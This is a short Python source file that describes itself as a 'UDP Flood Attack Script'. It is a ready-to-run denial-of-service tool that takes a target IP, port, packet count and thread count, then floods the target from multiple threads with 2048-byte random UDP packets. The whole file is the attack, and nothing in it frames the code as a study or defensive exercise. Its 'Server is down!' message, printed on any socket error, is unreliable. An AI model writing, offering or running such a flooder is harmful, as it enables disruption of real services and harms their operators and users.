#!/usr/bin/python3

import argparse
import socket
import threading
import random
import time

class DDoS:
    def __init__(self, ip, port, times):
        self.target = ip
        self.port = port
        self.times = times

    def attack(self):
        print(f"[*] Starting attack on {self.target}:{self.port} for {self.times} packets...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(2048)  # Adjust payload size as needed

            for _ in range(self.times):
                s.sendto(payload, (self.target, self.port))
        except socket.error:
            print(f"[*] Server is down! Exiting...")
        except Exception as e:
            print(f"[*] Error: {str(e)}")
        finally:
            s.close()

def parse_args():
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
    parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
    parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
    parser.add_argument("--times", dest="times", type=int, required=True, help="Number of packets to send")
    parser.add_argument("--threads", dest="threads", type=int, default=10, help="Number of threads")
    return parser.parse_args()

def main():
    args = parse_args()
    ip = args.ip
    port = args.port
    times = args.times
    threads = args.threads

    ddos_threads = []

    for _ in range(threads):
        ddos = DDoS(ip, port, times)
        ddos_thread = threading.Thread(target=ddos.attack)
        ddos_threads.append(ddos_thread)
        ddos_thread.start()

    for thread in ddos_threads:
        thread.join()

if __name__ == "__main__":
    main()
